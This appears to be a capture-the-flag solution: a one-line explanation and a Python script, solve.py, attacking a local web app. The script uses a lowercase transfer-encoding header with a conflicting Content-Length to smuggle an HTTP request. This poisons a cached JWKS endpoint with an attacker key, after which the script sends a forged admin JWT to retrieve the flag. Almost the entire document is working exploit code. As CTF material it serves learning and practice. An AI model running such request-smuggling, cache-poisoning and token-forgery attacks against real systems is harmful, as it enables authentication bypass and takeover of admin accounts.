use lower case transfer encoding to cause request smuggling which will lead to cache poisoning 
solve.py
```
import socket
import requests
import json
url = "http://localhost:8080"
s = requests.Session()
s.get(url)
user = {"username": "somer1234cs" , "password" : "asdf123ed"}
s.post(url+"/signup",data = user)
s.post(url+"/login",data=user)

key = {
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCkuU6E051FayM7hJ4RPDE7ahZG\nm4UTbILFpLjd1r6OU3L9+mkgp+OyNc9OgMFCzxK4yuMw9UPZX/0CVPciVKzjVQ+n\naj3AQqU8/pStES3ffQ3dX5Gtl45pMtexVcWx6pjSdhWpoE98v4ZdGcmt28NXpbRH\neZQxam+j/6xgBPh/3wIDAQAB"
            ]
        }
    ]
}
payload = 'HTTP/1.1 200 OK\nHost: localhost\n\r\n'+json.dumps(key)
post = {"title": payload,"content" : ""}
r= s.post(url+"/create_post", data=post, allow_redirects=False)
post = r.headers["location"]
user_id = post.split('/')[2]

server_address = ('localhost', 8080)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect(server_address)

smuggle = "GET {}\r\nHost: localhost\r\n\r\n".format(post)

http_request = """GET /post/asdf/f8badae4-0ff2-4fe8-ac15-3fc2d5b704c0 HTTP/1.1
Host: localhost
"""
http_request+="Content-Length: {}\n".format(14+len(smuggle))
http_request+="transfer-encoding: chunked\n"
http_request+='\r\n'
http_request+="4\r\na=bs\r\n0\r\n\r\n"+smuggle
http_request+=f"""GET /{user_id}/.well-known/jwks.json HTTP/1.1
Host: localhost
"""
http_request+='\r\n'

print(http_request)

client_socket.send(http_request.encode())

response = client_socket.recv(2048)
print(response.decode())

client_socket.close()

b =requests.get(url+f"/{user_id}/.well-known/jwks.json")
headers = {"Authorization" : "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.bLHThpy3ZL1uIJNarMluJgOwkn79CS-_6GHecDByxe_Fl-Z1-y5U4fcsGgRLRBU5PVWQCefpzjtm1Kdc4dgxWbsO0lpCHwdm5Qeaqhe6eLxiBpQH_Un0OSMY2SHhjmiXlNFSDyDgpXUSemGnTnQR47K_V9h50cM8_IIx1Lbzs4w"}
print(s.get(url+"/admin/flag", headers=headers).text)
```
